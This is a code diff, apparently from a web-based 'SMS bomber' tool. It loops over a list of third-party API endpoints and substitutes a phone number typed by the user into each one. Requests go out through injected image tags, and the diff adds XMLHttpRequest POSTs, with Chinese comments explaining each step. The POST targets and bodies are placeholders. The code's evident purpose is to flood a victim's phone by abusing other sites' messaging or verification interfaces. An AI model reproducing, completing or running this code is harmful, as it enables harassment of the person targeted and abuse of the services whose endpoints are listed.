@@ -248,12 +248,18 @@
             "http://www.52fzlt.cn/api.php?hm={phone}",
             "https://yun.2ov.xyz/api.php?hm={phone}",
         ];
-
+post=["1","2"];
+postsj=["1","2"];
         function fire() {
             var name = document.getElementById("last_name").value;
             for (var i = 0; i < jiekou.length; i++) {
-                jiekoua = jiekou[i].replace(/{phone}/, name)
-                document.getElementById("d1").innerHTML = "<img src='" + jiekoua + "'>";
+                document.getElementById("d1").innerHTML = "<img src='" + jiekou[i].replace(/{phone}/, name) + "'>";
+            }
+                        for (var i = 0; i < post.length; i++) {
+                var httpRequest = new XMLHttpRequest();//第一步：创建需要的对象
+httpRequest.open('POST', post[i], true); //第二步：打开连接
+httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");//设置请求头 注：post方式必须设置请求头（在建立连接后设置请求头）
+httpRequest.send(postsj[i].replace(/{phone}/, name));//发送请求 将情头体写在send中
             }
         }
     </script>
